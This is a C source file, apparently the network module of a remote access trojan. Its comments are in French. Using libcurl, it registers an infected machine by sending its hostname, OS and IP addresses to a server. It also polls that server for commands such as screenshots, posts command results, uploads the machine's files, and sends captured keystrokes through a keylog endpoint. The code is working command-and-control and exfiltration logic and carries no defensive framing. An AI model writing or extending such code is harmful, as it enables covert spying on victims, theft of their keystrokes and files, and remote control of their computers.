#include "communication.h"
#include "../config.h"
#include <curl/curl.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

/* Buffer interne pour capturer les réponses HTTP */
typedef struct {
    char  *data;
    size_t size;
} ResponseBuf;

static size_t write_cb(void *contents, size_t size, size_t nmemb, void *userp) {
    size_t real = size * nmemb;
    ResponseBuf *buf = (ResponseBuf *)userp;
    char *ptr = realloc(buf->data, buf->size + real + 1);
    if (!ptr) return 0;
    buf->data = ptr;
    memcpy(buf->data + buf->size, contents, real);
    buf->size += real;
    buf->data[buf->size] = '\0';
    return real;
}

int send_report(const char *url, const MachineReport *report) {
    CURL *curl = curl_easy_init();
    if (!curl) return 0;

    char json[DATA_BUFFER];
    snprintf(json, sizeof(json),
             "{\"hostname\":\"%s\",\"os_info\":\"%s\","
             "\"private_ip\":\"%s\",\"public_ip\":\"%s\"}",
             report->hostname, report->os_info,
             report->private_ip, report->public_ip);

    ResponseBuf buf = {malloc(1), 0};
    buf.data[0] = '\0';

    struct curl_slist *headers = curl_slist_append(NULL, "Content-Type: application/json");
    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_cb);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &buf);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 15L);
    curl_easy_perform(curl);

    /* Extrait l'ID depuis la réponse JSON : {"id": 42, ...} */
    int machine_id = 0;
    char *id_pos = strstr(buf.data, "\"id\":");
    if (id_pos) sscanf(id_pos + 5, " %d", &machine_id);

    free(buf.data);
    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
    return machine_id;
}

void get_command(int machine_id, char *out_command, size_t size) {
    CURL *curl = curl_easy_init();
    if (!curl) { out_command[0] = '\0'; return; }

    char url[BUFFER_SIZE];
    snprintf(url, sizeof(url), "%s/api/machines/%d/command", SERVER_BASE_URL, machine_id);

    ResponseBuf buf = {malloc(1), 0};
    buf.data[0] = '\0';

    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_cb);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &buf);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
    curl_easy_perform(curl);

    /* Extrait la valeur de "command" : {"command": "screenshot"} ou {"command": null} */
    out_command[0] = '\0';
    char *pos = strstr(buf.data, "\"command\":");
    if (pos) {
        pos += 10;
        while (*pos == ' ') pos++;
        if (*pos == '"') {
            pos++;
            size_t i = 0;
            while (*pos && *pos != '"' && i < size - 1)
                out_command[i++] = *pos++;
            out_command[i] = '\0';
        }
        /* si "null", out_command reste vide */
    }

    free(buf.data);
    curl_easy_cleanup(curl);
}

void post_result(int machine_id, const char *result_json) {
    CURL *curl = curl_easy_init();
    if (!curl) return;

    char url[BUFFER_SIZE];
    snprintf(url, sizeof(url), "%s/api/machines/%d/result", SERVER_BASE_URL, machine_id);

    /* On emballe result_json dans {"result": <json>} */
    size_t payload_size = strlen(result_json) + 16;
    char *payload = malloc(payload_size);
    if (!payload) { curl_easy_cleanup(curl); return; }
    snprintf(payload, payload_size, "{\"result\":%s}", result_json);

    struct curl_slist *headers = curl_slist_append(NULL, "Content-Type: application/json");
    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, payload);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 15L);
    curl_easy_perform(curl);

    free(payload);
    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
}

void upload_file(int machine_id, const char *filepath, const char *filename) {
    CURL *curl = curl_easy_init();
    if (!curl) return;

    char url[BUFFER_SIZE];
    snprintf(url, sizeof(url), "%s/api/machines/%d/upload", SERVER_BASE_URL, machine_id);

    curl_mime *form = curl_mime_init(curl);
    curl_mimepart *field = curl_mime_addpart(form);
    curl_mime_name(field, "file");
    curl_mime_filedata(field, filepath);
    curl_mime_filename(field, filename);

    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_MIMEPOST, form);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 60L);
    curl_easy_perform(curl);

    curl_mime_free(form);
    curl_easy_cleanup(curl);
}

void send_keylog(int machine_id, const char *data) {
    CURL *curl = curl_easy_init();
    if (!curl) return;

    char url[BUFFER_SIZE];
    snprintf(url, sizeof(url), "%s/api/machines/%d/keylog", SERVER_BASE_URL, machine_id);

    struct curl_slist *headers = curl_slist_append(NULL, "Content-Type: text/plain");
    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 15L);
    curl_easy_perform(curl);

    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
}
